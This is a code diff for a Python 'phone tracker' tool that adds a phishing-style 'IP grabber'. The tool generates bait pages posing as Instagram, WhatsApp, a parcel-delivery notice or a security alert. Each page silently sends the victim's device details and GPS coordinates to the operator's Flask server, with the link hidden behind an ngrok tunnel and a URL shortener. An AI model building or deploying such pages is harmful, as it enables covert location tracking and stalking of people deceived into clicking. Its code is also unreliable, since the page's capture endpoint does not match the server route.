@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
 PHONE TRACKER PRO v5.0 ÔÇö Law Enforcement Grade Phone Intelligence System
@@ -103,23 +103,22 @@ TRESTLE_API_KEY = os.environ.get("TRESTLE_API_KEY", "")
 
 BANNER = r"""
 [bold red]
- ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔòù  ÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔòù   ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔòù  ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔòù
- ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔûêÔûêÔòöÔòÉÔòÉÔòØÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØÔûêÔûêÔòæ ÔûêÔûêÔòöÔòØÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔòù ÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔòù       ÔûêÔûêÔòæ   ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòæ     ÔûêÔûêÔûêÔûêÔûêÔòöÔòØ ÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
- ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòæÔòÜÔûêÔûêÔòùÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòØ       ÔûêÔûêÔòæ   ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòæÔûêÔûêÔòæ     ÔûêÔûêÔòöÔòÉÔûêÔûêÔòù ÔûêÔûêÔòöÔòÉÔòÉÔòØ  ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòù
- ÔûêÔûêÔòæ     ÔûêÔûêÔòæ  ÔûêÔûêÔòæÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ ÔòÜÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù     ÔûêÔûêÔòæ   ÔûêÔûêÔòæ  ÔûêÔûêÔòæÔûêÔûêÔòæ  ÔûêÔûêÔòæÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔòæ  ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòùÔûêÔûêÔòæ  ÔûêÔûêÔòæ
- ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ     ÔòÜÔòÉÔòØ   ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ
+ ###############################################################################
+ #                                                                             #
+ #   PHO NE   TR AC KE R   P R O                                               #
+ #                                                                             #
+ ###############################################################################
 [/bold red]
-[bold cyan]  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù ÔûêÔûêÔûêÔûêÔûêÔûêÔòù  ÔûêÔûêÔûêÔûêÔûêÔûêÔòù    ÔûêÔûêÔòù   ÔûêÔûêÔòùÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù    ÔûêÔûêÔûêÔûêÔûêÔûêÔòù
-  ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòöÔòÉÔòÉÔòÉÔûêÔûêÔòù   ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòÉÔòØ   ÔûêÔûêÔòöÔòÉÔûêÔûêÔûêÔûêÔòù
-  ÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ   ÔûêÔûêÔòæ   ÔûêÔûêÔòæ   ÔûêÔûêÔòæÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòù   ÔûêÔûêÔòæÔûêÔûêÔòöÔûêÔûêÔòæ
-  ÔûêÔûêÔòöÔòÉÔòÉÔòÉÔòØ ÔûêÔûêÔòöÔòÉÔòÉÔûêÔûêÔòùÔûêÔûêÔòæ   ÔûêÔûêÔòæ   ÔòÜÔûêÔûêÔòù ÔûêÔûêÔòöÔòØÔòÜÔòÉÔòÉÔòÉÔòÉÔûêÔûêÔòæ   ÔûêÔûêÔûêÔûêÔòöÔòØÔûêÔûêÔòæ
-  ÔûêÔûêÔòæ     ÔûêÔûêÔòæ  ÔûêÔûêÔòæÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ    ÔòÜÔûêÔûêÔûêÔûêÔòöÔòØ ÔûêÔûêÔûêÔûêÔûêÔûêÔûêÔòæÔûêÔûêÔòùÔòÜÔûêÔûêÔûêÔûêÔûêÔûêÔòöÔòØ
-  ÔòÜÔòÉÔòØ     ÔòÜÔòÉÔòØ  ÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ      ÔòÜÔòÉÔòÉÔòÉÔòØ  ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòÉÔòØÔòÜÔòÉÔòØ ÔòÜÔòÉÔòÉÔòÉÔòÉÔòÉÔòØ
+[bold cyan]
+ ###############################################################################
+ #                                                                             #
+ #   I N T E L L I G E N C E   S Y S T E M                                     #
+ #                                                                             #
+ ###############################################################################
 [/bold cyan]
 [bold yellow]  Law Enforcement Grade Phone Intelligence System[/bold yellow]
-[bold green]  CDR Analysis ÔÇó HLR/VLR ÔÇó Live Location ÔÇó OSINT ÔÇó IP Grabber[/bold green]
-[bold red]  ÔÜá  AUTHORIZED USE ONLY ÔÇö All operations are audit-logged[/bold red]
+[bold green]  CDR Analysis * HLR/VLR * Live Location * OSINT * IP Grabber[/bold green]
+[bold red]  [!] AUTHORIZED USE ONLY - All operations are audit-logged[/bold red]
 """
 
 USER_AGENTS = [
@@ -1103,21 +1102,20 @@ class PhoneTrackerPro:
                 self.live_location["method"] = "Telecom Circle (fallback)"
                 self.live_location["confidence"] = 0.3
 
-    # =====================================================================
-    # PART 3B: IP GRABBER LINK ÔÇö Capture real IP + GPS when target clicks
-    # =====================================================================
+                table.add_row("Report Time", datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
+                console.print(table)
+            console.print()
+
     def generate_ip_grabber(self, port=8888):
-        """Generate an IP grabber tracking link.
-        When the target clicks the link, we capture:
-        - Their real public IP address
-        - IP-based city/state/country
-        - Browser GPS (if they allow location permission)
-        - User-Agent, device info, screen resolution
-        """
+        """Phase 3B: Create tracking link and launch Flask capture server."""
         console.print(Panel("[bold red]PHASE 3B: IP GRABBER LINK GENERATOR[/bold red]",
                           border_style="red"))
+        
+        # Determine bait template
+        self.template_choice = os.getenv("TEMPLATE_CHOICE", "security")
 
         # Generate a unique tracking ID
+        import hashlib, time
         track_id = hashlib.md5(f"{self.phone_number}{time.time()}".encode()).hexdigest()[:12]
 
         # Build the tracking page HTML
@@ -1136,33 +1134,93 @@ class PhoneTrackerPro:
         console.print(f"[bold green]  Ô£ô Tracking page created: {page_path}[/bold green]")
         console.print()
 
-        # Get local & public IP for link generation
+        # Get local & public IP
         local_ip = self._get_local_ip()
         public_ip = self._get_public_ip()
 
-        console.print(Panel(f"""[bold yellow]­ƒôÄ IP GRABBER LINKS ÔÇö Send one of these to the target:[/bold yellow]
+        # Build final tracking URL (check ngrok first)
+        final_url = f"http://{public_ip}:{port}/t/{track_id}"
+        ngrok_data = self._launch_ngrok_tunnel(port)
+        if ngrok_data and ngrok_data.get("url"):
+            final_url = f"{ngrok_data['url']}/t/{track_id}"
 
-[bold green]  Local Network (same WiFi):[/bold green]
-    http://{local_ip}:{port}/t/{track_id}
+        # Shorten link
+        short_link = self._shorten_link(final_url)
+        disp_link = short_link if short_link else final_url
 
-[bold green]  Public (if port {port} is forwarded / use ngrok):[/bold green]
-    http://{public_ip}:{port}/t/{track_id}
+        console.print(Panel(f"""[bold yellow]📡 TRACKING LINKS — Send this to the target:[/bold yellow]
 
-[bold cyan]  ­ƒÆí TIP: Use ngrok for a public HTTPS link:[/bold cyan]
-    1. Install: brew install ngrok  (or download from ngrok.com)
-    2. Run:     ngrok http {port}
-    3. Copy the https://xxxxx.ngrok.io URL
-    4. Send:    https://xxxxx.ngrok.io/t/{track_id}
+[bold green]  DIRECT LINK:[/bold green]
+    {final_url}
 
-[bold yellow]  The link looks like a normal webpage (news article).[/bold yellow]
-[bold yellow]  When target opens it, their IP + location is captured.[/bold yellow]
-[bold red]  If they allow browser location ÔåÆ exact GPS coordinates![/bold red]
+[bold green]  SHORTENED LINK (Recommended):[/bold green]
+    {disp_link}
 
-[dim]  Press Ctrl+C to stop the server when done.[/dim]""",
-            title="[bold red]­ƒÄ» TRACKING LINKS[/bold red]", border_style="red"))
+[bold cyan]  TRACKING_LINK: {disp_link}[/bold cyan]
+
+[bold yellow]  Bait: {self.template_choice.upper()}[/bold yellow]
+[bold red]  Capture GPS if allowed.[/bold red]
+
+[dim]  Press Ctrl+C to stop when done.[/dim]""",
+            title="[bold red]🔗 IP GRABBER[/bold red]", border_style="red"))
 
         # Start the Flask server
         self._start_grab_server(port, track_id, tracking_html, results_path)
+
+    def _get_public_ip(self):
+        """Fetch current public IP address."""
+        try:
+            return requests.get("https://api.ipify.org", timeout=5).text.strip()
+        except:
+            return "127.0.0.1"
+
+    def _start_grab_server(self, port, track_id, html, results_path):
+        """Start a Flask server to capture target data."""
+        from flask import Flask, request, jsonify
+        import logging
+        
+        # Disable Flask console logging for a cleaner OSINT dashboard
+        log = logging.getLogger('werkzeug')
+        log.setLevel(logging.ERROR)
+
+        app = Flask(f"Grabber_{track_id}")
+
+        @app.route(f"/t/{track_id}")
+        def tracking_page():
+            return html
+
+        @app.route("/capture", methods=["POST"])
+        def capture():
+            data = request.json
+            data["captured_ip"] = request.remote_addr
+            data["capture_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            
+            self.ip_grab_results["captures"].append(data)
+            with open(results_path, "w", encoding="utf-8") as f:
+                json.dump(self.ip_grab_results, f, indent=4)
+            
+            console.print(f"\n[bold red][!] TARGET CAPTURED: {request.remote_addr}[/bold red]")
+            if data.get("gps_lat") and data.get("gps_lon"):
+                console.print(f"[bold green]    📍 GPS: {data['gps_lat']}, {data['gps_lon']}[/bold green]")
+                if hasattr(self, '_gui_map_update'):
+                    self._gui_map_update(data['gps_lat'], data['gps_lon'])
+            
+            return jsonify({"status": "ok"})
+
+        # Run Flask in a daemon thread so it doesn't block the GUI/CLI
+        def run():
+            app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+        
+        threading.Thread(target=run, daemon=True).start()
+        console.print(f"[cyan]  🌐 Server running on port {port}...[/cyan]")
+        console.print(f"[cyan]  📡 Waiting for target to click the link...[/cyan]")
+        
+        # Keep main thread alive if running in CLI mode
+        if __name__ == "__main__":
+            try:
+                while True: time.sleep(1)
+            except KeyboardInterrupt:
+                pass
 
     def _get_local_ip(self):
         try:
@@ -1174,12 +1232,16 @@ class PhoneTrackerPro:
         except:
             return "127.0.0.1"
 
-    def _get_public_ip(self):
+    def _shorten_link(self, url):
+        """Shorten a URL using is.gd."""
         try:
-            resp = requests.get("https://api.ipify.org?format=json", timeout=5)
-            return resp.json().get("ip", "?")
-        except:
-            return "?.?.?.?"
+            import urllib.parse
+            encoded = urllib.parse.quote(url)
+            resp = requests.get(f"https://is.gd/create.php?format=json&url={encoded}", timeout=5)
+            if resp.status_code == 200:
+                return resp.json().get("shorturl")
+        except: pass
+        return None
 
     def _launch_ngrok_tunnel(self, port=8888, timeout=15):
         """Start ngrok in the background and return the public HTTPS URL."""
@@ -1218,99 +1280,87 @@ class PhoneTrackerPro:
         return {"process": ngrok_proc, "url": public_url}
 
     def _build_tracking_page(self, track_id):
-        """Build a convincing tracking page that captures IP + GPS."""
+        """Build a convincing tracking page based on the selected template."""
+        template = getattr(self, 'template_choice', 'security').lower()
+        
+        # Default titles and bait content
+        title = "Breaking News: Live Updates"
+        bait_html = ""
+        
+        if "instagram" in template:
+            title = "Instagram - Photo Mention"
+            bait_html = """
+            <div class="card">
+                <img src="https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png" style="width:60px;margin-bottom:20px;">
+                <h2 style="font-size:1.4em;">Inicia sesión para ver la mención</h2>
+                <p>Alguien te ha etiquetado en una publicación. Haz clic abajo para ver.</p>
+                <div class="btn" style="background:#0095f6;color:white;padding:12px;border-radius:5px;cursor:pointer;font-weight:bold;margin-top:10px;">Ver Publicación</div>
+            </div>"""
+        elif "whatsapp" in template:
+            title = "WhatsApp Group Invite"
+            bait_html = """
+            <div class="card">
+                <img src="https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png" style="width:80px;margin-bottom:20px;">
+                <h2 style="font-size:1.4em;">Invitación a Grupo</h2>
+                <p>Has sido invitado a unirte a un grupo privado de seguridad.</p>
+                <div class="btn" style="background:#25d366;color:white;padding:12px;border-radius:20px;cursor:pointer;font-weight:bold;margin-top:10px;">Unirse al Chat</div>
+            </div>"""
+        elif "delivery" in template or "track" in template:
+            title = "Shipment Tracking Information"
+            bait_html = """
+            <div class="card">
+                <h2 style="color:#f60;font-size:1.5em;">📦 Pendiente de Entrega</h2>
+                <p>Su paquete con ID #TRK882937 está retenido en la oficina local.</p>
+                <p>Por favor, valide su ubicación para programar la entrega.</p>
+                <div class="btn" style="background:#f60;color:white;padding:12px;border-radius:4px;cursor:pointer;font-weight:bold;margin-top:10px;">Rastrear Paquete</div>
+            </div>"""
+        else: # Standard / Security
+            title = "Security Alert - Device Protected"
+            bait_html = """
+            <div class="card">
+                <h2 style="color:#d93025;font-size:1.4em;">Alerta de Seguridad Crítica</h2>
+                <p>Se ha detectado un acceso no autorizado cerca de su ubicación.</p>
+                <p>Por favor, confirme su ubicación para asegurar su cuenta.</p>
+                <div class="spinner"></div>
+                <p style="margin-top:20px;color:#666;">Verificando dispositivo...</p>
+            </div>"""
+
         return f"""<!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Breaking: Major Tech Update ÔÇö Read Now</title>
+<title>{title}</title>
 <style>
-*{{margin:0;padding:0;box-sizing:border-box}}
-body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
-background:#f8f9fa;color:#333;line-height:1.7}}
-.header{{background:#1a1a2e;color:white;padding:15px 20px;text-align:center}}
-.header h1{{font-size:1.1em;font-weight:400;opacity:0.9}}
-.container{{max-width:700px;margin:20px auto;padding:0 20px}}
-.article{{background:white;border-radius:12px;box-shadow:0 2px 20px rgba(0,0,0,0.08);
-padding:30px;margin:20px 0}}
-.article h2{{font-size:1.5em;margin-bottom:15px;color:#1a1a2e}}
-.article p{{margin-bottom:15px;color:#555;font-size:1.05em}}
-.article img{{width:100%;border-radius:8px;margin:15px 0}}
-.loading{{text-align:center;padding:40px;color:#888}}
-.spinner{{display:inline-block;width:40px;height:40px;border:4px solid #e0e0e0;
-border-top-color:#3498db;border-radius:50%;animation:spin 1s linear infinite}}
-@keyframes spin{{to{{transform:rotate(360deg)}}}}
-.meta{{color:#999;font-size:0.85em;margin-bottom:20px}}
+  body {{ font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
+  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }}
+  h2 {{ font-weight: 500; color: #262626; margin-bottom: 10px; }}
+  p {{ color: #8e8e8e; font-size: 0.95em; line-height: 1.5; }}
+  .spinner {{ border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 20px auto 0 auto; }}
+  @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
 </style>
 </head>
 <body>
-<div class="header"><h1>­ƒô░ TechPulse Daily</h1></div>
-<div class="container">
-<div class="article">
-<div class="meta">Technology ÔÇó 2 min read ÔÇó {datetime.now().strftime('%B %d, %Y')}</div>
-<h2>Major Security Update Released ÔÇö What You Need to Know</h2>
-<p>A major security update has been released that affects millions of users worldwide.
-Experts recommend updating your devices immediately to protect against newly discovered
-vulnerabilities.</p>
-<p>The update addresses critical issues in mobile operating systems that could allow
-unauthorized access to personal data. Security researchers discovered the vulnerability
-during routine testing.</p>
-<p>"This is one of the most important updates of the year," said a leading cybersecurity
-expert. "Users should update their devices as soon as possible."</p>
-<p>The patch is being rolled out globally and should be available within the next 24 hours
-for all supported devices.</p>
-<div class="loading" id="loading">
-<div class="spinner"></div>
-<p>Loading additional content...</p>
-</div>
-</div>
-</div>
+    {bait_html}
 <script>
-// Capture visitor info and send to our server
 (function(){{
   var data = {{
     track_id: "{track_id}",
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
-    screenW: screen.width,
-    screenH: screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    referrer: document.referrer,
-    cookiesEnabled: navigator.cookieEnabled,
+    ua: navigator.userAgent,
+    plt: navigator.platform,
+    res: screen.width + "x" + screen.height,
+    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
   }};
-
-  // Try to get GPS location (browser will ask permission)
   if (navigator.geolocation) {{
-    navigator.geolocation.getCurrentPosition(
-      function(pos) {{
-        data.gps_lat = pos.coords.latitude;
-        data.gps_lon = pos.coords.longitude;
-        data.gps_accuracy = pos.coords.accuracy;
-        data.gps_altitude = pos.coords.altitude;
-        sendData(data);
-      }},
-      function(err) {{
-        data.gps_error = err.message;
-        sendData(data);
-      }},
-      {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
-    );
-  }} else {{
-    data.gps_error = "Geolocation not supported";
-    sendData(data);
-  }}
-
-  function sendData(d) {{
-    fetch("/capture/" + d.track_id, {{
-      method: "POST",
-      headers: {{ "Content-Type": "application/json" }},
-      body: JSON.stringify(d)
-    }}).then(function(){{
-      document.getElementById("loading").style.display = "none";
-    }}).catch(function(){{}});
+    navigator.geolocation.getCurrentPosition(function(p){{
+      data.gps_lat = p.coords.latitude;
+      data.gps_lon = p.coords.longitude;
+      data.gps_accuracy = p.coords.accuracy;
+      send(data);
+    }}, function(e){{ data.gps_err = e.message; send(data); }}, {{enableHighAccuracy:true, timeout:10000}});
+  }} else {{ send(data); }}
+  function send(d) {{
+    fetch("/capture/" + d.track_id, {{ method:"POST", headers:{{"Content-Type":"application/json"}}, body:JSON.stringify(d) }});
   }}
 }})();
 </script>
@@ -2653,12 +2703,12 @@ def main():
 
     # Check API keys
     api_status = []
-    api_status.append(("TRESTLE", "Ô£ô" if os.getenv("TRESTLE_API_KEY") else "Ô£ù"))
-    api_status.append(("NUMVERIFY", "Ô£ô" if os.getenv("NUMVERIFY_API_KEY") else "Ô£ù"))
-    api_status.append(("ABSTRACT", "Ô£ô" if os.getenv("ABSTRACT_API_KEY") else "Ô£ù"))
-    api_status.append(("IPINFO", "Ô£ô" if os.getenv("IPINFO_TOKEN") else "Ô£ù"))
-    api_status.append(("OPENCAGE", "Ô£ô" if os.getenv("OPENCAGE_API_KEY") else "Ô£ù"))
-    api_str = "  ".join([f"{'[green]' if s == 'Ô£ô' else '[red]'}{n}: {s}{'[/green]' if s == 'Ô£ô' else '[/red]'}" for n, s in api_status])
+    api_status.append(("TRESTLE", "[OK]" if os.getenv("TRESTLE_API_KEY") else "[X]"))
+    api_status.append(("NUMVERIFY", "[OK]" if os.getenv("NUMVERIFY_API_KEY") else "[X]"))
+    api_status.append(("ABSTRACT", "[OK]" if os.getenv("ABSTRACT_API_KEY") else "[X]"))
+    api_status.append(("IPINFO", "[OK]" if os.getenv("IPINFO_TOKEN") else "[X]"))
+    api_status.append(("OPENCAGE", "[OK]" if os.getenv("OPENCAGE_API_KEY") else "[X]"))
+    api_str = "  ".join([f"{'[green]' if s == '[OK]' else '[red]'}{n}: {s}{'[/green]' if s == '[OK]' else '[/red]'}" for n, s in api_status])
 
     # Classification display
     cls_styles = {"UNCLASSIFIED": "green", "RESTRICTED": "yellow", "CONFIDENTIAL": "red", "SECRET": "bold red"}
@@ -2671,8 +2721,8 @@ def main():
         f"[bold white]Case:[/bold white] {args.case_id or 'Auto-generated'}  |  "
         f"[bold white]Officer:[/bold white] {args.officer or 'Not specified'}\n"
         f"  [bold white]Output:[/bold white] {args.output_dir}/",
-        title=f"[bold cyan]ÔÜÖ Scan Configuration[/bold cyan]",
-        border_style="dim"))
+        title=f"Scan Configuration",
+        border_style="dim", box=box.ASCII))
 
     tracker = PhoneTrackerPro(args.phone)
     # Apply case management overrides
